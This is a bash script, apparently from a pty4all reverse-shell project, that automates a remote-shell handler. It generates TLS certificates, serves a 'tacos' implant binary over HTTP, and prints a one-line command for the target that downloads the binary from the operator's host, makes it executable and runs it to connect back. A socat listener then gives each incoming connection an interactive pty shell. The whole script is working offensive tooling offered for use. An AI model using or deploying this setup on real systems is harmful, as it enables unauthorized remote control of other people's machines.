#!/bin/bash

# From https://github.com/laluka/pty4all

for i in "$@"; do
    case $i in
    --lport)
        LPORT="$2"
        shift;shift;
        ;;
    --lhost)
        LHOST="$2"
        shift;shift;
        ;;
    --webport)
        WEBPORT="$2"
        shift;shift;
        ;;        
    --gitar)
        GITAR=true
        ;;
    --windows)
        WINDOWS=true
        ;;
    *)    
        ;;
    esac
done

#default value
if [[ -z "$WEBPORT" ]];
then
    WEBPORT=8080
fi

if [[ -z "$LHOST" ]] || [[ -z "$LPORT" ]];
then
    echo "Usage : $0 --lhost <LHOST> --lport <LPORT> --webport <WEB_PORT>"
    echo "to preload gitar shortcuts within reverse shell: $0 --lhost <LHOST> --lport <LPORT> --gitar"
    exit 92
fi

if [[ -z "${TMUX}" ]]; then
    echo "Must be run in tmux"
    exit 92
fi

if [[ "$WINDOWS" ]]; then
    BINARY="tacos.exe"
else
    BINARY="tacos"
fi

echo -e "\n\n\n[+] Generating tls certs and keys"
if [ -f server.pem ]; then
    echo "[+] Files already exist, using server.pem"
else
    rm server.key server.crt server.pem
    yes "" | openssl req -newkey rsa:2048 -nodes -keyout server.key -x509 -days 30 -out server.crt
    cat server.key server.crt >server.pem
fi

cp socat-forker.sh.tpl socat-forker.sh

if [[ "$GITAR" ]]; then
    echo "[+] gitar shortcuts enabled on reverse shell"
    sed -i "s/GITAR_HOST/${LHOST}/g" socat-forker.sh
    echo "[+] launch gitar server"
    tmux split-window -h "gitar -e ${LHOST} -p ${WEBPORT}"
else
    sed -i "/GITAR_HOST/d" socat-forker.sh
    echo "[+] gitar shortcuts  not enabled"
    tmux split-window -h "python3 -m http.server ${WEBPORT}"
fi

# put tacos in current directory
# cd ..  && make build.tacos && cd -
# mv ../tacos .

echo "[*] Launch tacos multi-handler ... put ${BINARY} in current directory"
echo "[*] Copy/paste following command on target:"
if [[ "$GITAR" ]]; then
	echo "curl -O ${LHOST}:${WEBPORT}/pull/${BINARY} && chmod +x ${BINARY} && ./${BINARY} ${LHOST}:${LPORT}"
else
	echo "curl -O ${LHOST}:${WEBPORT}/${BINARY} && .\${BINARY} ${LHOST}:${LPORT}"
fi

if [[ "$WINDOWS" ]]; then
    socat OPENSSL-LISTEN:4444,cert=server.pem,verify=0,reuseaddr,fork file:`tty` #to improve, for now windows does not like raw,echo=0
else
    socat OPENSSL-LISTEN:${LPORT},cert=server.pem,verify=0,reuseaddr,fork EXEC:./socat-forker.sh,pty,raw,echo=0
fi
